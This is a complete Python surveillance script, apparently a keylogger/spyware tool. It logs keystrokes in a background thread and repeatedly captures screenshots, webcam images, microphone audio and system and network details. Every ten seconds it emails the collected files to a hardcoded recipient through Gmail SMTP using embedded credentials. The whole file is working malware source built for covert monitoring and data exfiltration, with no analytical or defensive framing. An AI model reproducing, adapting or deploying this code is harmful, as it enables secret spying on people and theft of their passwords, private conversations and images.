import os
import platform
import logging
import smtplib
import time
from pathlib import Path
from threading import Thread
from PIL import ImageGrab
from pynput.keyboard import Listener
from scipy.io.wavfile import write
import sounddevice as sd
import cv2
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Configuration
SAVE_PATH = Path(r"./RESEARCH.LOC")
EMAIL_ADDRESS = "EXAMPLEMAIL@GOMAIL.COM"
EMAIL_PASSWORD = "adagebXXXXXXMDSMSCLSCMh"
RECIPIENT_EMAIL = "RECIPTDOIN@GMAIL.COM"

# Ensure directories exist
SAVE_PATH.mkdir(parents=True, exist_ok=True)
screenshot_dir = SAVE_PATH / "Screenshots"
audio_dir = SAVE_PATH / "Audio"
camera_dir = SAVE_PATH / "Camera"
screenshot_dir.mkdir(parents=True, exist_ok=True)
audio_dir.mkdir(parents=True, exist_ok=True)
camera_dir.mkdir(parents=True, exist_ok=True)

# File paths for system info and key logs
info_file = SAVE_PATH / "system_info.txt"
log_file = SAVE_PATH / "key_logs.txt"

# Initialize logging for key logs
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")


def send_email_with_attachments(files):
    """
    Sends an email with the specified files as attachments.
    """
    try:
        # Email setup
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECIPIENT_EMAIL
        msg["Subject"] = "Collected Data"

        # Email body
        body = "Attached are the collected files (screenshot, audio, webcam shot, key logs, and system info)."
        msg.attach(MIMEText(body, "plain"))

        # Attach files
        for file in files:
            if file.is_file():
                print(f"Attaching file: {file}")
                with open(file, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={file.name}",
                )
                msg.attach(part)

        # Send email
        print("Connecting to SMTP server...")
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            print("Logging into Gmail...")
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            print("Sending email...")
            server.send_message(msg)
            print("Email sent successfully!")

    except Exception as e:
        print(f"Failed to send email: {e}")


def gather_system_info():
    """
    Gathers system and hardware information and saves it to a file.
    """
    try:
        with info_file.open("w", encoding="utf-8") as file:
            # System information
            file.write(f"System: {platform.system()}\n")
            file.write(f"Node Name: {platform.node()}\n")
            file.write(f"Release: {platform.release()}\n")
            file.write(f"Version: {platform.version()}\n")
            file.write(f"Machine: {platform.machine()}\n")
            file.write(f"Processor: {platform.processor()}\n")

            # Network configuration
            file.write("\n--- Network Configuration ---\n")
            if platform.system() == "Windows":
                net_config = os.popen("ipconfig").read()
            else:
                net_config = os.popen("ifconfig").read()
            file.write(net_config)

            print(f"System info saved to: {info_file}")
    except Exception as e:
        print(f"Failed to gather system info: {e}")


def log_keys():
    """
    Logs keystrokes into a text file.
    """
    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


def capture_screenshot():
    """
    Captures a single screenshot and saves it to the directory.
    """
    try:
        screenshot_file = screenshot_dir / "latest_screenshot.png"
        ImageGrab.grab().save(screenshot_file)
        print(f"Captured screenshot: {screenshot_file}")
        return screenshot_file
    except Exception as e:
        print(f"Failed to capture screenshot: {e}")
        return None


def capture_webcam_shot():
    """
    Captures a single webcam shot and saves it to the directory.
    """
    cap = cv2.VideoCapture(0)  # Access the primary camera
    webcam_file = camera_dir / "latest_webcam.jpg"
    try:
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(str(webcam_file), frame)
            print(f"Captured webcam shot: {webcam_file}")
        else:
            print("Failed to capture image from webcam.")
    except Exception as e:
        print(f"Failed to capture webcam shot: {e}")
    finally:
        cap.release()
    return webcam_file


def record_audio():
    """
    Records a 10-second audio clip and saves it to the directory.
    """
    audio_file = audio_dir / "latest_audio.wav"
    try:
        fs = 44100  # Sampling rate
        duration = 10  # Duration in seconds
        print(f"Recording audio: {audio_file}")
        audio = sd.rec(int(fs * duration), samplerate=fs, channels=2)
        sd.wait()  # Wait for recording to finish
        write(audio_file, fs, audio)
    except Exception as e:
        print(f"Failed to record audio: {e}")
    return audio_file


def main():
    """
    Main function to periodically send one screenshot, audio, webcam shot, key logs, and system info.
    """
    # Start keylogger in a separate thread
    keylogger_thread = Thread(target=log_keys, daemon=True)
    keylogger_thread.start()

    while True:
        print("Gathering system info...")
        gather_system_info()

        print("Capturing screenshot...")
        screenshot_file = capture_screenshot()

        print("Capturing webcam shot...")
        webcam_file = capture_webcam_shot()

        print("Recording audio...")
        audio_file = record_audio()

        print("Sending email with attachments...")
        files_to_send = [info_file, log_file, screenshot_file, webcam_file, audio_file]
        send_email_with_attachments(files_to_send)

        print("Sleeping for 10 seconds...")
        time.sleep(10)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Program interrupted.")